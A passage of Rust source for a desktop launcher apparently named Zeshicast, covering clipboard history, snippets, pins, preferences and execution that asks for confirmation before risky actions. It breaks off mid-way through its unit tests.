use std::borrow::Cow;
use std::collections::{HashMap, HashSet};
use std::io;
use std::path::{Path, PathBuf};
use std::time::SystemTime;

pub use crate::services::clipboard_store::*;
use crate::services::storage;
use crate::services::text_input::{is_wtype_available, type_text_via_wtype};
use crate::{
    Action, ActionFormCommand, ActionKind, ActionRisk, AppEntry, CommandEntry, ExecutionDecision,
    ExecutionPolicy, ExecutionRequest, ExecutionTicket, ExtensionManifest, FileEntry, NamedValue,
    PlaceholderContext, ProcessCommand, ScriptEntry, SearchData, SecondaryAction,
    SecondaryActionKind, ShellCommand, append_alias, execute, expand_placeholders,
    expand_placeholders_shell, home_dir, load_aliases, load_apps, load_clipboard_history,
    load_command_entries, load_extension_command_entries, load_extension_manifests,
    load_extension_script_entries, load_file_index, load_frequencies, load_lines,
    load_named_values, load_preferences_with_backup, load_script_entries, normalize_alias,
    write_lines, write_preferences,
};

#[derive(Debug, Clone)]
pub struct CalcHistoryEntry {
    pub expr: String,
    pub result: String,
}

#[derive(Debug, Clone)]
pub struct Zeshicast {
    pub(crate) apps: Vec<AppEntry>,
    pub(crate) quicklinks: Vec<NamedValue>,
    pub(crate) snippets: Vec<NamedValue>,
    pub(crate) commands: Vec<CommandEntry>,
    pub(crate) scripts: Vec<ScriptEntry>,
    pub(crate) clipboard_history: Vec<String>,
    pub(crate) clipboard_timestamps: HashMap<String, i64>,
    pub(crate) calc_history: Vec<CalcHistoryEntry>,
    pub(crate) preferences: HashMap<String, String>,
    /// `false` when `preferences.toml` could not be parsed at startup: the file
    /// is never overwritten until the user fixes it (M-10).
    pub(crate) preferences_writable: bool,
    pub(crate) aliases: HashMap<String, String>,
    pub(crate) pins: HashSet<String>,
    pub(crate) recent: Vec<String>,
    pub(crate) frequencies: HashMap<String, u32>,
    pub(crate) extensions: Vec<ExtensionManifest>,
    pub(crate) files: Vec<FileEntry>,
    pub(crate) config_dir: PathBuf,
}

pub(crate) fn preference_enabled_value(
    preferences: &HashMap<String, String>,
    key: &str,
    default_value: bool,
) -> bool {
    preferences
        .get(key)
        .and_then(|value| parse_bool_preference(value))
        .unwrap_or(default_value)
}

#[derive(Debug, Clone)]
pub struct SnippetSummary {
    pub id: i64,
    pub name: String,
    pub prefix: String,
    pub preview: String,
    pub value: String,
    pub tags: Vec<String>,
}

fn migrate_legacy_storage_if_needed(config_dir: &Path) {
    if !storage::clipboard_has_data(config_dir) {
        let legacy = load_clipboard_history(&config_dir.join("clipboard.txt"));
        if !legacy.is_empty() {
            storage::migrate_clipboard(config_dir, &legacy).ok();
        }
    }
    if !storage::usage_has_data(config_dir) {
        let recent_legacy = load_lines(&config_dir.join("recent.txt"))
            .into_iter()
            .map(|l| l.to_lowercase())
            .collect::<Vec<_>>();
        let freq_legacy = load_frequencies(&config_dir.join("frequencies.txt"));
        if !recent_legacy.is_empty() {
            storage::migrate_usage(config_dir, &recent_legacy, &freq_legacy).ok();
        }
    }
    if !storage::snippet_has_data(config_dir) {
        let legacy = load_named_values(&config_dir.join("snippets.txt"));
        if !legacy.is_empty() {
            let entries: Vec<(String, String, Vec<String>)> = legacy
                .into_iter()
                .map(|item| (item.name, item.value, item.tags))
                .collect();
            storage::migrate_snippets(config_dir, &entries).ok();
        }
    }
}

struct LoadedClipboardAndUsage {
    history: Vec<String>,
    timestamps: HashMap<String, i64>,
    recent: Vec<String>,
    frequencies: HashMap<String, u32>,
}

fn load_clipboard_and_usage(
    config_dir: &Path,
    preferences: &HashMap<String, String>,
) -> LoadedClipboardAndUsage {
    let clipboard_retention = clipboard_retention_value(preferences);
    let clip_rows = storage::clipboard_load_with_limit(config_dir, clipboard_retention);
    let history: Vec<String> = clip_rows.iter().map(|(t, _)| t.clone()).collect();
    let timestamps: HashMap<String, i64> = clip_rows.into_iter().collect();
    let _ = prune_clipboard_image_cache(&history);

    let recent = storage::usage_recent(config_dir, 50);
    let frequencies = storage::usage_frequencies(config_dir);

    LoadedClipboardAndUsage {
        history,
        timestamps,
        recent,
        frequencies,
    }
}

fn load_commands_and_scripts(
    config_dir: &Path,
    script_dirs: &[PathBuf],
    extensions: &[ExtensionManifest],
) -> (Vec<CommandEntry>, Vec<ScriptEntry>) {
    let mut commands = load_command_entries(&config_dir.join("commands"));
    commands.extend(load_extension_command_entries(extensions));
    let mut scripts = load_script_entries(script_dirs);
    scripts.extend(load_extension_script_entries(extensions));
    (commands, scripts)
}

impl Zeshicast {
    pub fn load() -> Self {
        Self::load_inner(true)
    }

    /// Like `load`, but skips the (potentially slow) filesystem index so the GUI
    /// can present its window without blocking on a `$HOME` walk. Pair with
    /// [`build_file_index`](Self::build_file_index) +
    /// [`set_file_index`](Self::set_file_index) to fill it in on a worker thread.
    #[cfg(feature = "gui")]
    pub(crate) fn load_deferred_files() -> Self {
        Self::load_inner(false)
    }

    /// Build the filesystem index. Safe to call off the main thread.
    #[cfg(feature = "gui")]
    pub(crate) fn build_file_index() -> Vec<FileEntry> {
        load_file_index(&home_dir())
    }

    /// Install a filesystem index built elsewhere (see `build_file_index`).
    #[cfg(feature = "gui")]
    pub(crate) fn set_file_index(&mut self, files: Vec<FileEntry>) {
        self.files = files;
    }

    fn load_inner(index_files: bool) -> Self {
        let home = home_dir();
        let config_dir = home.join(".config/zeshicast");
        let preferences_path = config_dir.join("preferences.toml");
        let (preferences, preferences_writable) = load_preferences_with_backup(&preferences_path);
        let script_dirs = preference_script_dirs(&preferences, &config_dir);
        let extensions = load_extension_manifests(&config_dir);

        migrate_legacy_storage_if_needed(&config_dir);
        let storage_data = load_clipboard_and_usage(&config_dir, &preferences);
        let (commands, scripts) = load_commands_and_scripts(&config_dir, &script_dirs, &extensions);
        let calc_history = load_calc_history(&config_dir.join("calc_history.json"));

        let snippets = if storage::snippet_has_data(&config_dir) {
            storage::snippets_load(&config_dir)
                .into_iter()
                .map(|record| NamedValue {
                    name: record.title,
                    value: record.content,
                    tags: record.tags,
                })
                .collect()
        } else {
            load_named_values(&config_dir.join("snippets.txt"))
        };

        Self {
            apps: load_apps(&home),
            quicklinks: load_named_values(&config_dir.join("quicklinks.txt")),
            snippets,
            commands,
            scripts,
            clipboard_history: storage_data.history,
            clipboard_timestamps: storage_data.timestamps,
            calc_history,
            preferences,
            preferences_writable,
            aliases: load_aliases(&config_dir.join("aliases.txt")),
            pins: load_lines(&config_dir.join("pins.txt"))
                .into_iter()
                .map(|line| line.to_lowercase())
                .collect(),
            recent: storage_data.recent,
            frequencies: storage_data.frequencies,
            extensions,
            files: if index_files {
                load_file_index(&home)
            } else {
                Vec::new()
            },
            config_dir,
        }
    }

    pub fn reload(&mut self) {
        *self = Self::load();
    }

    /// Snapshot of the inputs `search` reads (M-1).
    ///
    /// The palette moves this to a worker thread: `Zeshicast` itself is an
    /// `Rc<RefCell<..>>` shared with the widgets and therefore not `Send`.
    pub(crate) fn search_data(&self) -> SearchData {
        SearchData {
            apps: self.apps.clone(),
            quicklinks: self.quicklinks.clone(),
            snippets: self.snippets.clone(),
            commands: self.commands.clone(),
            scripts: self.scripts.clone(),
            clipboard_history: self.clipboard_history.clone(),
            preferences: self.preferences.clone(),
            aliases: self.aliases.clone(),
            pins: self.pins.clone(),
            recent: self.recent.clone(),
            frequencies: self.frequencies.clone(),
            extensions: self.extensions.clone(),
            files: self.files.clone(),
            calc_history: self.calc_history.clone(),
        }
    }

    pub fn search(&self, query: &str) -> Vec<Action> {
        self.search_data().search(query)
    }

    pub fn run_action(&mut self, action: &Action) -> ExecutionDecision {
        self.run_action_with_policy(action, ExecutionPolicy::interactive())
    }

    pub fn run_action_confirmed(&mut self, action: &Action) -> ExecutionDecision {
        self.run_action_with_policy(action, ExecutionPolicy::confirmed())
    }

    fn run_action_with_policy(
        &mut self,
        action: &Action,
        policy: ExecutionPolicy,
    ) -> ExecutionDecision {
        let decision = action.run_with_policy(policy);
        if !matches!(decision, ExecutionDecision::RunNow) {
            return decision;
        }
        if action.category == "Calculator"
            && let Some((expr, result)) = action.title.split_once(" = ")
        {
            self.record_calc(expr.trim(), result.trim());
        }
        if let Err(error) = self.record_recent(action) {
            eprintln!("failed to record recent action: {error}");
        }
        decision
    }

    pub fn available_secondary_actions(&self, action: &Action) -> Vec<SecondaryAction> {
        use crate::ActionPanelSection as S;
        let can_type = is_wtype_available();
        let is_text_action = matches!(action.category.as_str(), "Snippet" | "Clipboard");
        let mut actions = vec![
            SecondaryAction::new(
                SecondaryActionKind::Run,
                "Run",
                "media-playback-start-symbolic",
                S::Primary,
            ),
            SecondaryAction::new(
                SecondaryActionKind::CopyValue,
                "Copy Value",
                "edit-copy-symbolic",
                S::Primary,
            ),
        ];

        if can_type && is_text_action {
            actions.push(SecondaryAction::new(
                SecondaryActionKind::TypeText,
                "Expand (type text)",
                "input-keyboard-symbolic",
                S::Primary,
            ));
        }

        let is_app_or_script = matches!(
            action.category.as_str(),
            "Application" | "Script" | "Command" | "System"
        );
        if is_app_or_script {
            actions.push(SecondaryAction::new(
                SecondaryActionKind::RunInTerminal,
                "Run in Terminal",
                "utilities-terminal-symbolic",
                S::Primary,
            ));
        }

        if action.parent_dir().is_some() {
            actions.push(SecondaryAction::new(
                SecondaryActionKind::OpenParent,
                "Open Containing Folder",
                "folder-open-symbolic",
                S::Primary,
            ));
        }

        if action.category == "Clipboard" {
            actions.push(SecondaryAction::new(
                SecondaryActionKind::DeleteClipboardItem,
                "Delete Clipboard Item",
                "edit-delete-symbolic",
                S::Clipboard,
            ));
            actions.push(SecondaryAction::new(
                SecondaryActionKind::ClearClipboardHistory,
                "Clear Clipboard History",
                "edit-clear-symbolic",
                S::Danger,
            ));
        }

        if self.is_pinned(action) {
            actions.push(SecondaryAction::new(
                SecondaryActionKind::Unpin,
                "Unpin",
                "view-pin-symbolic",
                S::Manage,
            ));
        } else {
            actions.push(SecondaryAction::new(
                SecondaryActionKind::Pin,
                "Pin",
                "view-pin-symbolic",
                S::Manage,
            ));
        }

        actions
    }

    pub fn record_calc(&mut self, expr: &str, result: &str) {
        self.calc_history.retain(|e| e.expr != expr);
        self.calc_history.insert(
            0,
            CalcHistoryEntry {
                expr: expr.to_string(),
                result: result.to_string(),
            },
        );
        self.calc_history.truncate(20);
        save_calc_history(
            &self.config_dir.join("calc_history.json"),
            &self.calc_history,
        );
    }

    pub fn is_recent(&self, action: &Action) -> bool {
        let identity = action.identity().to_lowercase();
        self.recent.iter().any(|entry| entry == &identity)
    }

    pub fn recent_top_identities(&self, count: usize) -> Vec<String> {
        self.recent
            .iter()
            .filter(|id| !self.pins.contains(*id))
            .take(count)
            .cloned()
            .collect()
    }

    /// Runs a secondary action under an interactive policy. Risky secondary
    /// operations (`DeleteClipboardItem`, `ClearClipboardHistory`) are not
    /// executed and return `ExecutionDecision::NeedsConfirmation` instead.
    pub fn run_secondary_action(
        &mut self,
        action: &Action,
        secondary: SecondaryActionKind,
    ) -> io::Result<ExecutionDecision> {
        self.run_secondary_action_with_confirmation(action, secondary, false)
    }

    /// Runs a secondary action after the caller has obtained user
    /// confirmation for its risk.
    pub fn run_secondary_action_confirmed(
        &mut self,
        action: &Action,
        secondary: SecondaryActionKind,
    ) -> io::Result<ExecutionDecision> {
        self.run_secondary_action_with_confirmation(action, secondary, true)
    }

    fn run_secondary_action_with_confirmation(
        &mut self,
        action: &Action,
        secondary: SecondaryActionKind,
        confirmed: bool,
    ) -> io::Result<ExecutionDecision> {
        let risk = crate::secondary_action_risk(action, secondary);
        if risk.requires_confirmation() && !confirmed {
            return Ok(ExecutionDecision::NeedsConfirmation(risk));
        }
        match secondary {
            SecondaryActionKind::Run => {
                let policy = if confirmed {
                    ExecutionPolicy::confirmed()
                } else {
                    ExecutionPolicy::interactive()
                };
                Ok(self.run_action_with_policy(action, policy))
            }
            SecondaryActionKind::CopyValue => {
                action.copy_value();
                Ok(ExecutionDecision::RunNow)
            }
            SecondaryActionKind::TypeText => {
                type_text_via_wtype(&action.value());
                Ok(ExecutionDecision::RunNow)
            }
            SecondaryActionKind::OpenParent => {
                action.open_parent_dir();
                Ok(ExecutionDecision::RunNow)
            }
            SecondaryActionKind::Pin => {
                self.pin_action(action)?;
                Ok(ExecutionDecision::RunNow)
            }
            SecondaryActionKind::Unpin => {
                self.unpin_action(action)?;
                Ok(ExecutionDecision::RunNow)
            }
            SecondaryActionKind::DeleteClipboardItem => {
                self.delete_clipboard_item(action)?;
                Ok(ExecutionDecision::RunNow)
            }
            SecondaryActionKind::ClearClipboardHistory => {
                self.clear_clipboard_history()?;
                Ok(ExecutionDecision::RunNow)
            }
            SecondaryActionKind::RunInTerminal => {
                // The terminal runs the action's text through a login shell, so
                // it is gated exactly like a command: capabilities from the
                // action, Shell risk, and the decision returned upward instead
                // of spawning directly (P1.1).
                let pref = self
                    .get_preferences()
                    .get("default_terminal")
                    .map(String::as_str);
                let command = crate::services::terminal::terminal_process_command(
                    &action.value(),
                    pref,
                    true,
                );
                let ticket = ExecutionTicket {
                    policy: if confirmed {
                        ExecutionPolicy::confirmed()
                    } else {
                        ExecutionPolicy::interactive()
                    },
                    capabilities: action.capabilities.clone(),
                    risk: ActionRisk::Shell,
                };
                Ok(execute(ExecutionRequest::Command(command), &ticket))
            }
        }
    }

    pub fn add_clipboard_text(&mut self, text: &str) -> io::Result<bool> {
        if !self.clipboard_history_enabled() || self.clipboard_private_mode() {
            return Ok(false);
        }
        // Incoming text is sanitized here: pasted text must never be able to
        // claim to be an image entry (M-15).
        let text = crate::normalize_clipboard_text(text);
        if text.is_empty() {
            return Ok(false);
        }
        self.store_clipboard_entry(text)
    }

    /// Retention/insertion tail shared by text and image entries. The caller is
    /// responsible for sanitizing untrusted input; the image sentinel is added
    /// by [`Self::add_clipboard_image`] after sanitization, not parsed from it.
    fn store_clipboard_entry(&mut self, text: String) -> io::Result<bool> {
        let retention = self.clipboard_retention();
        storage::clipboard_insert_with_limit(&self.config_dir, &text, retention)
            .map_err(|e| io::Error::other(e.to_string()))?;
        self.clipboard_timestamps
            .entry(text.clone())
            .or_insert_with(crate::unix_now);
        self.clipboard_history.retain(|e| e != &text);
        self.clipboard_history.insert(0, text);
        self.clipboard_history.truncate(retention);
        prune_clipboard_image_cache(&self.clipboard_history)?;
        Ok(true)
    }

    pub fn delete_clipboard_item(&mut self, action: &Action) -> io::Result<()> {
        self.delete_clipboard_value(&action.value())
    }

    pub fn delete_clipboard_value(&mut self, value: &str) -> io::Result<()> {
        storage::clipboard_delete(&self.config_dir, value)
            .map_err(|e| io::Error::other(e.to_string()))?;
        self.clipboard_history.retain(|e| e != value);
        self.clipboard_timestamps.remove(value);
        prune_clipboard_image_cache(&self.clipboard_history)?;
        Ok(())
    }

    pub fn clear_clipboard_history(&mut self) -> io::Result<()> {
        storage::clipboard_clear(&self.config_dir).map_err(|e| io::Error::other(e.to_string()))?;
        self.clipboard_history.clear();
        self.clipboard_timestamps.clear();
        clear_clipboard_image_cache()?;
        Ok(())
    }

    pub fn list_clipboard_history(&self) -> Vec<ClipboardSummary> {
        self.clipboard_history
            .iter()
            .map(|entry| {
                let kind = classify_clipboard_text(entry);
                let preview = if kind == ClipboardKind::Image {
                    "Image".to_string()
                } else {
                    crate::clipboard_preview(entry)
                };
                ClipboardSummary {
                    preview,
                    value: entry.clone(),
                    kind,
                    size_bytes: entry.len(),
                    timestamp: self.clipboard_timestamps.get(entry).copied(),
                }
            })
            .collect()
    }

    /// Record a captured image (already cached as a PNG at `path`).
    pub fn add_clipboard_image(&mut self, path: &str) -> io::Result<bool> {
        if !self.clipboard_capture_images() {
            return Ok(false);
        }
        // The entry is built here rather than sanitized from input, so the
        // sentinel survives and the cached PNG is recognised (and kept by the
        // pruner) instead of degrading into a text entry.
        self.store_clipboard_entry(format!("{CLIPBOARD_IMAGE_PREFIX}{path}"))
    }

    pub fn list_snippets(&self) -> Vec<SnippetSummary> {
        if storage::snippet_has_data(&self.config_dir) {
            storage::snippets_load(&self.config_dir)
                .into_iter()
                .map(|r| SnippetSummary {
                    id: r.id,
                    name: r.title,
                    prefix: r.prefix,
                    preview: crate::clipboard_preview(&r.content),
                    value: r.content,
                    tags: r.tags,
                })
                .collect()
        } else {
            self.snippets
                .iter()
                .enumerate()
                .map(|(i, snippet)| SnippetSummary {
                    id: (i + 1) as i64,
                    name: snippet.name.clone(),
                    prefix: String::new(),
                    preview: crate::clipboard_preview(&snippet.value),
                    value: snippet.value.clone(),
                    tags: snippet.tags.clone(),
                })
                .collect()
        }
    }

    pub fn delete_snippet(&mut self, name: &str, value: &str) -> io::Result<()> {
        storage::snippet_delete_by_title_and_content(&self.config_dir, name, value).ok();
        self.snippets
            .retain(|snippet| snippet.name != name || snippet.value != value);
        self.write_snippets()
    }

    pub fn delete_snippet_by_id(&mut self, id: i64) -> io::Result<()> {
        storage::snippet_delete(&self.config_dir, id).ok();
        self.reload_snippets();
        self.write_snippets()
    }

    pub fn add_snippet(&mut self, name: &str, value: &str) -> io::Result<()> {
        let name = name.trim();
        let value = value.trim();
        if name.is_empty() || value.is_empty() {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "snippet name and value are required",
            ));
        }
        storage::snippet_insert(&self.config_dir, name, "", value, &["ai".to_string()]).ok();
        self.snippets.push(NamedValue {
            name: name.to_string(),
            value: value.to_string(),
            tags: vec!["ai".to_string()],
        });
        self.write_snippets()
    }

    pub fn save_snippet(
        &mut self,
        id: Option<i64>,
        title: &str,
        prefix: &str,
        content: &str,
        tags: &[String],
    ) -> io::Result<()> {
        let title = title.trim();
        let content = content.trim();
        if title.is_empty() || content.is_empty() {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "snippet title and content are required",
            ));
        }

        if let Some(id) = id {
            storage::snippet_update(&self.config_dir, id, title, prefix, content, tags).ok();
        } else {
            storage::snippet_insert(&self.config_dir, title, prefix, content, tags).ok();
        }

        self.reload_snippets();
        self.write_snippets()
    }

    fn reload_snippets(&mut self) {
        if storage::snippet_has_data(&self.config_dir) {
            self.snippets = storage::snippets_load(&self.config_dir)
                .into_iter()
                .map(|r| NamedValue {
                    name: r.title,
                    value: r.content,
                    tags: r.tags,
                })
                .collect();
        }
    }

    fn write_snippets(&self) -> io::Result<()> {
        let lines = self
            .snippets
            .iter()
            .map(|snippet| {
                if snippet.tags.is_empty() {
                    format!("{} = {}", snippet.name, snippet.value)
                } else {
                    format!(
                        "{} | {} = {}",
                        snippet.name,
                        snippet.tags.join(", "),
                        snippet.value
                    )
                }
            })
            .collect::<Vec<_>>();
        write_lines(&self.config_dir.join("snippets.txt"), &lines)
    }

    pub fn set_alias_for_action(&mut self, alias: &str, action: &Action) -> io::Result<String> {
        let alias = normalize_alias(alias);
        if alias.is_empty() {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "alias is empty",
            ));
        }

        let target = action.title.clone();
        append_alias(&self.config_dir, &alias, &target)?;
        self.aliases.insert(alias.clone(), target);
        Ok(alias)
    }

    pub fn is_pinned(&self, action: &Action) -> bool {
        let title = action.title.to_lowercase();
        let identity = action.identity().to_lowercase();
        self.pins.contains(&title) || self.pins.contains(&identity)
    }

    pub fn pin_action(&mut self, action: &Action) -> io::Result<()> {
        self.pins.insert(action.identity().to_lowercase());
        self.write_pins()
    }

    pub fn unpin_action(&mut self, action: &Action) -> io::Result<()> {
        let title = action.title.to_lowercase();
        let identity = action.identity().to_lowercase();
        self.pins.remove(&title);
        self.pins.remove(&identity);
        self.write_pins()
    }

    fn preference_enabled(&self, key: &str, default_value: bool) -> bool {
        preference_enabled_value(&self.preferences, key, default_value)
    }

    pub fn clipboard_history_enabled(&self) -> bool {
        self.preference_enabled("clipboard_history_enabled", true)
    }

    pub fn clipboard_private_mode(&self) -> bool {
        self.preference_enabled("clipboard_private_mode", false)
    }

    pub fn clipboard_capture_images(&self) -> bool {
        self.preference_enabled("clipboard_capture_images", true)
            && self.clipboard_history_enabled()
            && !self.clipboard_private_mode()
    }

    pub fn notifications_history_enabled(&self) -> bool {
        self.preference_enabled("notifications_enabled", true)
            && self.preference_enabled("notifications_history_enabled", true)
    }

    fn clipboard_retention(&self) -> usize {
        clipboard_retention_value(&self.preferences)
    }

    fn enforce_clipboard_retention(&mut self) -> io::Result<()> {
        let retention = self.clipboard_retention();
        storage::clipboard_prune(&self.config_dir, retention)
            .map_err(|e| io::Error::other(e.to_string()))?;
        self.clipboard_history.truncate(retention);
        prune_clipboard_image_cache(&self.clipboard_history)
    }

    /// Submits a form under the interactive policy: the manifest capability
    /// ceiling carried by the form is checked first, and a risky form returns
    /// [`ExecutionDecision::NeedsConfirmation`] instead of executing.
    pub fn run_form_action(
        &mut self,
        action: &Action,
        values: HashMap<String, String>,
    ) -> ExecutionDecision {
        self.run_form_action_with_policy(action, values, ExecutionPolicy::interactive())
    }

    /// Submits a form after the caller obtained user confirmation.
    pub fn run_form_action_confirmed(
        &mut self,
        action: &Action,
        values: HashMap<String, String>,
    ) -> ExecutionDecision {
        self.run_form_action_with_policy(action, values, ExecutionPolicy::confirmed())
    }

    fn run_form_action_with_policy(
        &mut self,
        action: &Action,
        values: HashMap<String, String>,
        policy: ExecutionPolicy,
    ) -> ExecutionDecision {
        let ActionKind::Form(form) = &action.kind else {
            return ExecutionDecision::Denied("action is not a form".to_string());
        };
        let ticket = ExecutionTicket {
            policy,
            capabilities: form.capabilities.clone(),
            risk: form.risk,
        };
        let mut args = form.current_args.clone();
        args.extend(values);
        let context = PlaceholderContext {
            query: form.partial_query.clone(),
            clipboard: self.clipboard_history.first().cloned().unwrap_or_default(),
            args,
            preferences: Cow::Owned(form.preferences.clone()),
            now: SystemTime::now(),
        };
        let env: HashMap<String, String> = form
            .env
            .iter()
            .map(|(k, v)| (k.clone(), expand_placeholders(v, &context)))
            .collect();
        let request = match &form.command {
            ActionFormCommand::Shell(command) => ExecutionRequest::Shell {
                command: ShellCommand::with_env(expand_placeholders_shell(command, &context), env),
            },
            ActionFormCommand::Argv { program, args } => {
                ExecutionRequest::Command(ProcessCommand::with_env(
                    expand_placeholders(program, &context),
                    args.iter()
                        .map(|arg| expand_placeholders(arg, &context))
                        .collect(),
                    env,
                ))
            }
        };
        let decision = execute(request, &ticket);
        if matches!(decision, ExecutionDecision::RunNow)
            && let Err(e) = self.record_recent(action)
        {
            eprintln!("failed to record recent: {e}");
        }
        decision
    }

    pub fn get_preferences(&self) -> &HashMap<String, String> {
        &self.preferences
    }

    pub fn set_preference(&mut self, key: String, value: String) -> io::Result<()> {
        if !self.preferences_writable {
            // M-10: the file on disk is corrupt; writing now would erase it.
            return Err(io::Error::new(
                io::ErrorKind::PermissionDenied,
                format!(
                    "{} is not valid TOML; fix or remove it before changing preferences",
                    self.config_dir.join("preferences.toml").display()
                ),
            ));
        }
        let should_prune_clipboard = key == "clipboard_retention";
        if value.is_empty() {
            self.preferences.remove(&key);
        } else {
            self.preferences.insert(key, value);
        }
        write_preferences(&self.config_dir.join("preferences.toml"), &self.preferences)?;
        if should_prune_clipboard {
            self.enforce_clipboard_retention()?;
        }
        Ok(())
    }

    pub fn list_commands(&self) -> Vec<CommandSummary> {
        let mut summaries = self
            .commands
            .iter()
            .map(|e| CommandSummary {
                kind: "Command".to_string(),
                name: e.name.clone(),
                category: e.category.clone(),
                description: e.description.clone(),
                keyword: e.keyword.clone(),
                icon_name: e.icon_name.clone(),
                tags: e.tags.clone(),
                permissions: e.permissions.clone(),
                capabilities: e
                    .capabilities
                    .iter()
                    .map(|capability| capability.label().to_string())
                    .collect(),
                extension: e.origin.as_ref().map(ExtensionSummary::from_origin),
                enabled: true,
            })
            .collect::<Vec<_>>();

        summaries.extend(self.scripts.iter().map(|script| {
            CommandSummary {
                kind: "Script".to_string(),
                name: script.title.clone(),
                category: "Script".to_string(),
                description: script.description.clone(),
                keyword: None,
                icon_name: script.icon.clone(),
                tags: Vec::new(),
                permissions: script
                    .origin
                    .as_ref()
                    .map(|origin| origin.capabilities.clone())
                    .unwrap_or_default(),
                capabilities: script
                    .origin
                    .as_ref()
                    .map(|origin| origin.capabilities.clone())
                    .unwrap_or_default(),
                extension: script.origin.as_ref().map(ExtensionSummary::from_origin),
                enabled: true,
            }
        }));

        summaries.sort_by(|a, b| {
            a.extension_group()
                .cmp(&b.extension_group())
                .then(a.kind.cmp(&b.kind))
                .then(a.name.cmp(&b.name))
        });
        summaries
    }

    pub(crate) fn record_recent(&mut self, action: &Action) -> io::Result<()> {
        let identity = action.identity().to_lowercase();
        storage::usage_record(&self.config_dir, &identity)
            .map_err(|e| io::Error::other(e.to_string()))?;
        self.recent.retain(|e| e != &identity);
        self.recent.insert(0, identity.clone());
        self.recent.truncate(50);
        *self.frequencies.entry(identity).or_insert(0) += 1;
        Ok(())
    }

    fn write_pins(&self) -> io::Result<()> {
        let mut pins = self.pins.iter().cloned().collect::<Vec<_>>();
        pins.sort();
        write_lines(&self.config_dir.join("pins.txt"), &pins)
    }
}

fn parse_bool_preference(value: &str) -> Option<bool> {
    match value.trim().to_ascii_lowercase().as_str() {
        "true" | "yes" | "on" | "1" => Some(true),
        "false" | "no" | "off" | "0" => Some(false),
        _ => None,
    }
}

fn load_calc_history(path: &std::path::Path) -> Vec<CalcHistoryEntry> {
    let Ok(content) = std::fs::read_to_string(path) else {
        return Vec::new();
    };
    let Ok(array) = serde_json::from_str::<serde_json::Value>(&content) else {
        return Vec::new();
    };
    let Some(items) = array.as_array() else {
        return Vec::new();
    };
    items
        .iter()
        .filter_map(|item| {
            let expr = item.get("e")?.as_str()?.to_string();
            let result = item.get("r")?.as_str()?.to_string();
            Some(CalcHistoryEntry { expr, result })
        })
        .collect()
}

fn save_calc_history(path: &std::path::Path, history: &[CalcHistoryEntry]) {
    let array: Vec<serde_json::Value> = history
        .iter()
        .map(|e| serde_json::json!({"e": e.expr, "r": e.result}))
        .collect();
    if let Ok(json) = serde_json::to_string(&array) {
        crate::write_file_atomic(path, json.as_bytes(), 0o600).ok();
    }
}

fn preference_script_dirs(
    preferences: &HashMap<String, String>,
    config_dir: &std::path::Path,
) -> Vec<std::path::PathBuf> {
    let custom = preferences.get("script_dirs").map(|value| {
        value
            .split(',')
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(std::path::PathBuf::from)
            .collect::<Vec<_>>()
    });
    custom.unwrap_or_else(|| vec![config_dir.join("scripts")])
}

#[derive(Debug, Clone)]
pub struct CommandSummary {
    pub kind: String,
    pub name: String,
    pub category: String,
    pub description: String,
    pub keyword: Option<String>,
    pub icon_name: String,
    pub tags: Vec<String>,
    pub permissions: Vec<String>,
    pub capabilities: Vec<String>,
    pub extension: Option<ExtensionSummary>,
    pub enabled: bool,
}

impl CommandSummary {
    pub fn extension_group(&self) -> String {
        self.extension
            .as_ref()
            .map(|extension| extension.name.clone())
            .unwrap_or_else(|| "Built-in".to_string())
    }

    pub fn extension_detail(&self) -> String {
        self.extension
            .as_ref()
            .map(|extension| format!("{}@{}", extension.id, extension.version))
            .unwrap_or_else(|| "legacy command directories".to_string())
    }
}

#[derive(Debug, Clone)]
pub struct ExtensionSummary {
    pub id: String,
    pub name: String,
    pub version: String,
    pub capabilities: Vec<String>,
}

impl ExtensionSummary {
    pub(crate) fn from_origin(origin: &crate::ExtensionOrigin) -> Self {
        Self {
            id: origin.id.clone(),
            name: origin.name.clone(),
            version: origin.version.clone(),
            capabilities: origin.capabilities.clone(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ActionForm;
    use std::fs;
    use std::time::{SystemTime, UNIX_EPOCH};

    fn test_cache_dir(name: &str) -> PathBuf {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        std::env::temp_dir().join(format!("zeshicast-{name}-{}-{nanos}", std::process::id()))
    }

    fn image_entry(path: &Path) -> String {
        format!("{CLIPBOARD_IMAGE_PREFIX}{}", path.display())
    }

    fn test_app(config_dir: PathBuf, preferences: HashMap<String, String>) -> Zeshicast {
        Zeshicast {
            apps: Vec::new(),
            quicklinks: Vec::new(),
            snippets: Vec::new(),
            commands: Vec::new(),
            scripts: Vec::new(),
            clipboard_history: Vec::new(),
            clipboard_timestamps: HashMap::new(),
            calc_history: Vec::new(),
            preferences,
            preferences_writable: true,
            aliases: HashMap::new(),
            pins: HashSet::new(),
            recent: Vec::new(),
            frequencies: HashMap::new(),
            extensions: Vec::new(),
            files: Vec::new(),
            config_dir,
        }
    }

    /// Search must read launcher preferences by reference:
    /// `Zeshicast::search` calls
    /// `PlaceholderContext::new(..).with_preferences(&self.preferences)`, so
    /// building the per-keystroke context borrows the map instead of cloning
    /// it. The snippet expansion here only compiles and resolves while the
    /// context holds a borrowed `Cow::Borrowed(preferences)`.
    #[test]
    fn search_expands_preferences_from_borrowed_map() {
        let mut app = test_app(
            test_cache_dir("search-borrow-preferences"),
            HashMap::from([("deploy_token".to_string(), "secret-token".to_string())]),
        );
        app.snippets.push(NamedValue {
            name: "show deploy token".to_string(),
            value: "token={{pref:deploy_token}}".to_string(),
            tags: Vec::new(),
        });

        let actions = app.search("show deploy token");
        let expanded = actions
            .iter()
            .find(|action| action.category == "Snippet")
            .map(|action| match &action.kind {
                ActionKind::Copy(value) => value.clone(),
                _ => panic!("snippet should produce a copy action"),
            })
            .expect("snippet matching its own name should be found");

        assert_eq!(expanded, "token=secret-token");
    }

    #[test]
    fn clipboard_image_entry_round_trips_and_survives_pruning() {
        // Regression (P1.7 follow-up): `add_clipboard_image` must not run the
        // internal sentinel through the paste-ingest sanitizer, otherwise the
        // entry degrades to text and the cached PNG is pruned away again.
        let cache = test_cache_dir("clipboard-image-roundtrip");
        fs::create_dir_all(&cache).unwrap();
        let image = cache.join("shot.png");
        fs::write(&image, b"png").unwrap();

        let mut app = test_app(
